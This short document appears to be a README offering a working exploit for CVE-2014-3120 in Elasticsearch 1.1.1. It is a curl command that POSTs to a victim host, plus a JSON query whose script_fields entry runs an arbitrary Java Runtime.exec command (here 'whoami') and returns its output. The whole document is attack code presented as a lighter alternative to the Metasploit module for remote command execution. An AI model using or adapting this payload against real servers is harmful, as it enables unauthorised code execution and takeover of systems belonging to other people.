#Exploit for Elastic Search
##Version 1.1.1, 
CVE ID is 2014-3120 https://www.cvedetails.com/cve/CVE-2014-3120/

The vulnerability allows the attacker to execute arbitrary java commands with the privileges of the service. 

Idea is a dirty one liner adapted from the metasploit module, when metasploit isnt available but standard HTTP POST is allowed.

```
curl $VICTIM:PORT/_search?pretty -X POST --data @elastic
```

where a file 'elastic' contains:

```
{
"size":1, 
"query":{
"filtered":{
"query":{
"match_all":{}
}}}, 
"script_fields":
{"msf_result":
{"script":"java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec('whoami').getInputStream())); reader.readLine()"
}}
}
```

